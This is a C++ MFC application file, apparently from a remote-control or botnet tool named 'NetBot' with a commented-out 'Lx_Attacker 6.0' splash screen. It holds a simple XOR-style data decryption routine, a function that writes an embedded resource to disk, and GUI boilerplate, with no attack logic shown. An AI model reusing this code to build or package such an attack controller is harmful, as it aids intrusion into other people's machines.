// NetBot.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "NetBot.h"
#include "NetBotDlg.h"

#include "ExClass/IniFile.h"

#pragma comment(linker,"/NODEFAULTLIB:msvcrt.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CNetBotApp

BEGIN_MESSAGE_MAP(CNetBotApp, CWinApp)
	//{{AFX_MSG_MAP(CNetBotApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CNetBotApp construction

CNetBotApp::CNetBotApp()
{
	pSplash = NULL;
	VipID = vipid;
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CNetBotApp object

CNetBotApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CNetBotApp initialization
void CNetBotApp::DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)
{
	unsigned char p = (unsigned char)key % 254 + 1;

	for (unsigned long i = 0; i < nLen; i++)
	{
		*szRec -= p;
		*szRec ^= p;
		szRec++;
	}
}

BOOL LoadSource(UINT resoure_id, const char * type, const char * filepath)
{
	HRSRC hRsrc = ::FindResource(NULL, MAKEINTRESOURCE(resoure_id), CA2T(type));

	if (hRsrc)
	{
		DWORD size = SizeofResource(NULL, hRsrc);
		HGLOBAL  handle = LoadResource(NULL, hRsrc);

		if (handle)
		{
			BYTE *MemPtr = (BYTE *)LockResource(handle);

			CFile file;

			if (file.Open(CA2T(filepath), CFile::modeCreate | CFile::modeWrite))
			{
				file.Write(MemPtr, size);

				file.Close();
			}
			UnlockResource(handle);
		}
		FreeResource(handle);
		return TRUE;
	}
	return FALSE;
}

BOOL CNetBotApp::InitInstance()
{
	AfxEnableControlContainer();

	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#if _MSC_VER <= 1200
#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif
#endif

	//SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

	CNetBotDlg dlg;
	m_pMainWnd = &dlg;

	/**********************************��������*****************************************************

		pSplash=new CSplashScreenEx();
		pSplash->Create(m_pMainWnd,NULL,CSS_FADE | CSS_CENTERSCREEN | CSS_SHADOW);
		pSplash->SetBitmap(IDB_LOGO,255,0,255);
		pSplash->SetTextFont("MS Sans Serif",100,CSS_TEXT_NORMAL);
		pSplash->SetTextRect(CRect(20,100,250,120));//��������
		pSplash->SetTextColor(RGB(255,0,0));
		pSplash->SetTextFormat(DT_SINGLELINE | DT_CENTER | DT_VCENTER);
		pSplash->SetText("Lx_Attacker 6.0 Version");                  //��������

		pSplash->Show();

	 //**********************************��������*****************************************************/

	 // 	SkinH_AttachEx("Aero.she",NULL);
	 // 	SkinH_SetAero(1);
	 // 	SkinH_SetMenuAlpha(220);

	AttachImageList();

	int nResponse = dlg.DoModal();
	if (nResponse == IDOK)
	{
		//  dismissed with OK
	}
	else if (nResponse == IDCANCEL)
	{
		//  dismissed with Cancel
	}

	// Since the dialog has been closed, return FALSE so that we exit the
	//  application, rather than start the application's message pump.
	return FALSE;
}

int CNetBotApp::ExitInstance()
{
	DetachImageList();
	return CWinApp::ExitInstance();
}

void CNetBotApp::AttachImageList()
{
	SHFILEINFO sfi;

	TCHAR cWinDir[100];
	GetWindowsDirectory(cWinDir, 100);

	HIMAGELIST hSystemImageList = (HIMAGELIST)SHGetFileInfo((LPCTSTR)cWinDir, 0, &sfi, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	m_SmallImgList.Attach(hSystemImageList);
	hSystemImageList = (HIMAGELIST)SHGetFileInfo((LPCTSTR)cWinDir, 0, &sfi, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_ICON);
	m_LargeImgList.Attach(hSystemImageList);
}

void CNetBotApp::DetachImageList()
{
	m_SmallImgList.Detach();
	m_LargeImgList.Detach();
}
